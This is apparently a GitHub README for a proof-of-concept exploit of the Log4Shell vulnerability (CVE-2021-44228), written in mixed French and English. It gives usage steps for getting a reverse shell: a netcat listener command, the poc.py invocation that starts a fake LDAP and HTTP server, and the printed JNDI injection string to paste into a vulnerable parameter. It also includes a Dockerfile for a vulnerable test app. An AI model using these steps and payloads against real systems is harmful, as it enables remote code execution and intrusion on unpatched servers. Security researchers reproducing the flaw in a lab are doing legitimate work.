# log4j-shell-poc
A Proof-Of-Concept pour la récente vulnérabilité trouvée CVE-2021-44228 vulnerability. <br><br>
Log4j, a java logging library largement utilisée en elasticsearch, minecraft et autres.



Démo: 
----------------------------------------

Vuln Web App:

https://user-images.githubusercontent.com/87979263/146113359-20663eaa-555d-4d60-828d-a7f769ebd266.mp4

<br>

Ghidra (Old script):

https://user-images.githubusercontent.com/87979263/145728478-b4686da9-17d0-4511-be74-c6e6fff97740.mp4

<br>

Minecraft PoC (Old script):

https://user-images.githubusercontent.com/87979263/145681727-2bfd9884-a3e6-45dd-92e2-a624f29a8863.mp4


Proof-of-concept (POC)
----------------------

Pour une  PoC, le fichier poc.py est pour. 


#### Prérequis:
```bash
pip install -r requirements.txt
```
#### Usage:


* Lancer un netcat listener pour accepter la connexion reverse shell <br>
```py
nc -lvnp 9001
```
* Launch the exploit.<br>
**Note:** Extraire java archive dans le même dossier sous le nom: `jdk1.8.0_20`.
```py
$ python3 poc.py --userip localhost --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228
[!] Github repo: https://github.com/kozmer/log4j-shell-poc

[+] Exploit java class created success
[+] Setting up fake LDAP server

[+] Send me: ${jndi:ldap://localhost:1389/a}

Listening on 0.0.0.0:1389
```

Ce script va configurer un HTTP server et LDAP server pour vous, et il va créer un payload que vous pouvez  coller sur le paramètre vulnerable . Afprès cela, si tout marche bien, vous allez avoir un shell sur lport.

<br>


Notre vulnerable application
--------------------------

We have added a Dockerfile with the vulnerable webapp. You can use this by following the steps below:
```c
1: docker build -t log4j-shell-poc .
2: docker run --network host log4j-shell-poc
```
Une fois lancer, vous pouvez accéder par: localhost:8080


Java version.
--------------------------------------

Java 8: `java-8u20`.

[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html).<br>


Once you have downloaded and extracted the archive, you can find `java` and a few related binaries in `jdk1.8.0_20/bin`.<br>


```
❯ tar -xf jdk-8u20-linux-x64.tar.gz

❯ ./jdk1.8.0_20/bin/java -version
java version "1.8.0_20"
Java(TM) SE Runtime Environment (build 1.8.0_20-b26)
Java HotSpot(TM) 64-Bit Server VM (build 25.20-b23, mixed mode)
```


